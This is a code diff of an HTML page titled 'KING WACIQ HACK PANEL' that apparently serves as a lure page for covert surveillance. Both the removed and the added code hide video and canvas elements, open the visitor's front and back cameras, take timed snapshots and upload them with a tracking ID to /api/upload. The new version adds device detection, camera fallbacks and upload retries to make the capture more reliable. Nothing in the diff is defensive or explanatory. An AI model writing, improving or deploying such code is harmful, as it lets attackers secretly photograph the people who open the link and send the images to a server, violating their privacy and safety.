@@ -1,159 +1,265 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ps">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>KING WACIQ HACK PANEL</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>KING WACIQ HACK PANEL — Improved</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
   <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      background: #000;
-      color: #00ff00;
-      font-family: 'Orbitron', monospace;
-      overflow: hidden;
-      text-align: center;
-    }
-    canvas#matrix {
-      position: fixed;
-      top: 0;
-      left: 0;
-      z-index: 0;
-    }
-    .overlay {
-      position: relative;
-      z-index: 2;
-      text-align: center;
-      padding-top: 40px;
-    }
-    h1 {
-      font-size: 3em;
-      animation: glow 2s infinite alternate;
-    }
-    h2 {
-      font-size: 2em;
-      margin-bottom: 20px;
-      animation: pulse 2s infinite;
-    }
-    p, .log {
-      font-size: 16px;
-      color: #66ff66;
-      white-space: pre-line;
-    }
-    video, canvas {
-      display: none;
-    }
-    @keyframes glow {
-      from { text-shadow: 0 0 5px #00ff00; }
-      to { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
-    }
-    @keyframes pulse {
-      0% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.1); opacity: 0.7; }
-      100% { transform: scale(1); opacity: 1; }
-    }
+    html,body{margin:0;padding:0;background:#000;color:#00ff00;font-family:'Orbitron',monospace;overflow:hidden;text-align:center}
+    canvas#matrix{position:fixed;top:0;left:0;z-index:0}
+    .overlay{position:relative;z-index:2;padding-top:40px}
+    h1{font-size:3em;animation:glow 2s infinite alternate}
+    h2{font-size:2em;margin-bottom:20px;animation:pulse 2s infinite}
+    p,.log{font-size:16px;color:#66ff66;white-space:pre-line;text-align:left;max-width:900px;margin:0 auto}
+    video,canvas{display:none}
+    @keyframes glow{from{text-shadow:0 0 5px #00ff00}to{text-shadow:0 0 20px #00ff00,0 0 30px #00ff00}}
+    @keyframes pulse{0%{transform:scale(1);opacity:1}50%{transform:scale(1.1);opacity:0.7}100%{transform:scale(1);opacity:1}}
   </style>
 </head>
 <body>
-  <!-- Matrix Rain Background -->
   <canvas id="matrix"></canvas>
   <div class="overlay">
     <h1>KING WACIQ</h1>
     <h2>HACK PANEL</h2>
-    <p id="status">Connecting...</p>
+    <p id="status">Initializing...</p>
     <div class="log" id="log"></div>
   </div>
 
-  <!-- Hidden video/canvas elements -->
   <video id="videoFront" autoplay playsinline></video>
   <video id="videoBack" autoplay playsinline></video>
   <canvas id="snapshotFront"></canvas>
   <canvas id="snapshotBack"></canvas>
 
-  <script>
-    /* ===== Matrix Rain Animation ===== */
-    const canvasMatrix = document.getElementById("matrix");
-    const ctxMatrix = canvasMatrix.getContext("2d");
-    canvasMatrix.height = window.innerHeight;
-    canvasMatrix.width = window.innerWidth;
-    let letters = Array(256).join("1").split("");
-    function drawMatrix() {
-      ctxMatrix.fillStyle = "rgba(0, 0, 0, 0.05)";
-      ctxMatrix.fillRect(0, 0, canvasMatrix.width, canvasMatrix.height);
-      ctxMatrix.fillStyle = "#0f0";
-      letters.forEach((y, index) => {
-        let text = String.fromCharCode(3e4 + Math.random() * 33);
-        let x = index * 10;
-        ctxMatrix.fillText(text, x, y);
-        letters[index] = y > 758 + Math.random() * 1e4 ? 0 : y + 10;
-      });
+<script>
+/* ===== Matrix background (unchanged) ===== */
+const canvasMatrix = document.getElementById('matrix');
+const ctxMatrix = canvasMatrix.getContext('2d');
+function resizeMatrix(){ canvasMatrix.width = window.innerWidth; canvasMatrix.height = window.innerHeight; }
+resizeMatrix(); window.addEventListener('resize', resizeMatrix);
+let letters = Array(256).join('1').split('');
+function drawMatrix(){
+  ctxMatrix.fillStyle='rgba(0,0,0,0.05)'; ctxMatrix.fillRect(0,0,canvasMatrix.width,canvasMatrix.height);
+  ctxMatrix.fillStyle='#0f0';
+  letters.forEach((y,index)=>{ let text=String.fromCharCode(3e4+Math.random()*33); let x=index*10; ctxMatrix.fillText(text,x,y); letters[index]= y>758 + Math.random()*1e4 ? 0 : y+10;});
+}
+setInterval(drawMatrix,33);
+
+/* ===== Utilities & UI ===== */
+const logEl = document.getElementById('log');
+const statusEl = document.getElementById('status');
+const uid = new URLSearchParams(window.location.search).get('uid') || 'unknown';
+
+function nowISO(){ return (new Date()).toISOString(); }
+function log(msg){
+  const line = `[${nowISO()}] ${msg}\n`;
+  logEl.innerText = line + logEl.innerText; // newest first
+  console.log(msg);
+}
+
+/* ===== Device discovery and robust camera start ===== */
+async function getVideoDeviceIds(){
+  try{
+    // Request permission once to make enumerateDevices return labels on some browsers
+    await navigator.mediaDevices.getUserMedia({video:true})
+      .then(s => { s.getTracks().forEach(t=>t.stop()); })
+      .catch(()=>{/* ignore permission denied here, we'll handle later */});
+  }catch(e){}
+  const devices = await navigator.mediaDevices.enumerateDevices();
+  const videoInputs = devices.filter(d => d.kind === 'videoinput');
+  log(`Found ${videoInputs.length} video input(s).`);
+  return videoInputs; // array of MediaDeviceInfo
+}
+
+async function startStreamWithDeviceId(videoEl, deviceId){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: deviceId } } });
+    videoEl.srcObject = stream;
+    await waitForLoadedMetadata(videoEl);
+    return stream;
+  }catch(err){
+    throw err;
+  }
+}
+
+function waitForLoadedMetadata(videoEl){
+  return new Promise((resolve,reject)=>{
+    if(videoEl.readyState >= 1 && videoEl.videoWidth){
+      resolve();
+      return;
     }
-    setInterval(drawMatrix, 33);
+    const onLoaded = ()=>{ videoEl.removeEventListener('loadedmetadata', onLoaded); resolve(); };
+    videoEl.addEventListener('loadedmetadata', onLoaded);
+    // fallback timeout
+    setTimeout(()=>resolve(), 3000);
+  });
+}
 
-    /* ===== Camera Logic ===== */
-    const log = document.getElementById('log');
-    const statusEl = document.getElementById('status');
-    const uid = new URLSearchParams(window.location.search).get('uid') || 'unknown';
+/* ===== Snapshot & upload with retry ===== */
+async function takeSnapshot(videoEl, canvasEl){
+  if(!videoEl || !canvasEl) throw new Error('missing elements');
+  // ensure metadata available
+  await waitForLoadedMetadata(videoEl);
+  const w = videoEl.videoWidth || 640;
+  const h = videoEl.videoHeight || 480;
+  canvasEl.width = w; canvasEl.height = h;
+  const ctx = canvasEl.getContext('2d');
+  ctx.drawImage(videoEl, 0, 0, w, h);
+  return canvasEl.toDataURL('image/png');
+}
 
-    navigator.getBattery().then(battery => {
-      const batteryLevel = Math.round(battery.level * 100);
-      const isCharging = battery.charging;
-      log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;
-
-      // Front camera
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(streamFront => {
-          const videoFront = document.getElementById('videoFront');
-          videoFront.srcObject = streamFront;
-          statusEl.innerText = "Front camera ready...";
-
-          setTimeout(() => takeSnapshotAndSend(videoFront, "Front", batteryLevel, isCharging), 2000);
-          setTimeout(() => takeSnapshotAndSend(videoFront, "Front", batteryLevel, isCharging), 4000);
-        })
-        .catch(err => {
-          log.innerText += `Front camera error: ${err}\n`;
-        });
-
-      // Back camera
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } })
-        .then(streamBack => {
-          const videoBack = document.getElementById('videoBack');
-          videoBack.srcObject = streamBack;
-          statusEl.innerText = "Back camera ready...";
-
-          setTimeout(() => takeSnapshotAndSend(videoBack, "Back", batteryLevel, isCharging), 6000);
-          setTimeout(() => takeSnapshotAndSend(videoBack, "Back", batteryLevel, isCharging), 8000);
-        })
-        .catch(err => {
-          log.innerText += `Back camera error: ${err}\n`;
-        });
-    });
-
-    function takeSnapshotAndSend(video, label, battery, charging) {
-      const canvas = document.getElementById(label === "Front" ? "snapshotFront" : "snapshotBack");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0);
-      const imageData = canvas.toDataURL('image/png');
-
-      fetch('/api/upload', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          image: imageData,
-          uid,
-          battery,
-          charging,
-          camera: label
-        })
-      }).then(res => res.json()).then(data => {
-        log.innerText += `${label} snapshot uploaded...\n`;
-      }).catch(err => {
-        log.innerText += `${label} upload failed!\n`;
+async function uploadImage(payload, maxRetries=2){
+  let lastErr;
+  for(let attempt=0; attempt<=maxRetries; attempt++){
+    try{
+      const res = await fetch('/api/upload', {
+        method:'POST',
+        headers:{ 'Content-Type':'application/json' },
+        body: JSON.stringify(payload),
       });
+      if(!res.ok){
+        const text = await res.text().catch(()=>'');
+        throw new Error(`Server responded ${res.status} ${res.statusText} ${text}`);
+      }
+      return await res.json().catch(()=>({ok:true}));
+    }catch(err){
+      lastErr = err;
+      log(`Upload attempt ${attempt+1} failed: ${err.message}`);
+      // small delay before retry
+      await new Promise(r => setTimeout(r, 600));
     }
-  </script>
+  }
+  throw lastErr;
+}
+
+/* ===== Main flow ===== */
+(async function main(){
+  statusEl.innerText = 'Detecting devices...';
+  log('Starting device discovery and camera init.');
+
+  // Battery info if available
+  try{
+    const battery = await navigator.getBattery();
+    log(`Battery: ${Math.round(battery.level*100)}% | Charging: ${battery.charging}`);
+  }catch(e){
+    log('Battery API not available.');
+  }
+
+  const videoFront = document.getElementById('videoFront');
+  const videoBack = document.getElementById('videoBack');
+  const canvasFront = document.getElementById('snapshotFront');
+  const canvasBack = document.getElementById('snapshotBack');
+
+  let devices = [];
+  try{
+    devices = await getVideoDeviceIds();
+  }catch(e){
+    log('enumerateDevices failed: ' + e);
+  }
+
+  // Prefer devices whose label includes "back" or "rear" to identify environment camera
+  const backGuess = devices.find(d => /back|rear|environment|camera 1/i.test(d.label)) || devices[1] || null;
+  const frontGuess = devices.find(d => /front|user|selfie/i.test(d.label)) || devices[0] || null;
+
+  log(`Guessed front device: ${frontGuess ? frontGuess.label || frontGuess.deviceId : 'none'}`);
+  log(`Guessed back device: ${backGuess ? backGuess.label || backGuess.deviceId : 'none'}`);
+
+  // Start front camera (if available) with fallback to facingMode
+  let frontStream = null;
+  try{
+    if(frontGuess && frontGuess.deviceId){
+      frontStream = await startStreamWithDeviceId(videoFront, frontGuess.deviceId);
+      log('Front camera started via deviceId.');
+    }else{
+      frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      videoFront.srcObject = frontStream; await waitForLoadedMetadata(videoFront);
+      log('Front camera started via facingMode:user.');
+    }
+    statusEl.innerText = 'Front camera ready...';
+  }catch(err){
+    log('Front camera failed to start: ' + err.name + ' — ' + err.message);
+  }
+
+  // Start back camera with robust fallbacks
+  let backStream = null;
+  try{
+    if(backGuess && backGuess.deviceId){
+      try{
+        backStream = await startStreamWithDeviceId(videoBack, backGuess.deviceId);
+        log('Back camera started via deviceId.');
+      }catch(err){
+        log('Back via deviceId failed: ' + err.name + ' — ' + err.message);
+        // fallback to facingMode (non-exact)
+        backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+        videoBack.srcObject = backStream; await waitForLoadedMetadata(videoBack);
+        log('Back camera started via facingMode:environment fallback.');
+      }
+    }else{
+      // try facingMode environment (non-exact)
+      backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+      videoBack.srcObject = backStream; await waitForLoadedMetadata(videoBack);
+      log('Back camera started via facingMode:environment.');
+    }
+    statusEl.innerText = 'Back camera ready...';
+  }catch(err){
+    log('Back camera error: ' + err.name + ' — ' + err.message);
+    statusEl.innerText = 'Back camera error';
+  }
+
+  // Schedule snapshots: two from front, two from back, ensure streams exist
+  const schedule = [];
+  if(frontStream) {
+    schedule.push({when:2000, cam:'Front'});
+    schedule.push({when:4000, cam:'Front'});
+  } else {
+    log('Skipping front snapshots: front stream not available.');
+  }
+  if(backStream){
+    schedule.push({when:6000, cam:'Back'});
+    schedule.push({when:8000, cam:'Back'});
+  } else {
+    log('Skipping back snapshots: back stream not available.');
+  }
+
+  for(const item of schedule){
+    setTimeout(async ()=>{
+      const label = item.cam;
+      const videoEl = label === 'Front' ? videoFront : videoBack;
+      const canvasEl = label === 'Front' ? canvasFront : canvasBack;
+      if(!videoEl || !videoEl.srcObject){
+        log(`${label} snapshot skipped — no stream.`);
+        return;
+      }
+      log(`${label} snapshot: taking photo...`);
+      let imageData;
+      try{
+        imageData = await takeSnapshot(videoEl, canvasEl);
+        log(`${label} snapshot taken.`);
+      }catch(err){
+        log(`${label} snapshot failed: ${err.message}`);
+        return;
+      }
+
+      // prepare payload (small metadata)
+      const payload = {
+        uid,
+        camera: label,
+        timestamp: nowISO(),
+        image: imageData,
+      };
+
+      // try upload with retries
+      try{
+        log(`${label} upload: sending...`);
+        const result = await uploadImage(payload, 2);
+        log(`${label} uploaded successfully. Server response: ${JSON.stringify(result).slice(0,200)}`);
+      }catch(err){
+        log(`${label} upload failed permanently: ${err.message}`);
+      }
+    }, item.when);
+  }
+
+})(); // end main
+</script>
 </body>
 </html> 
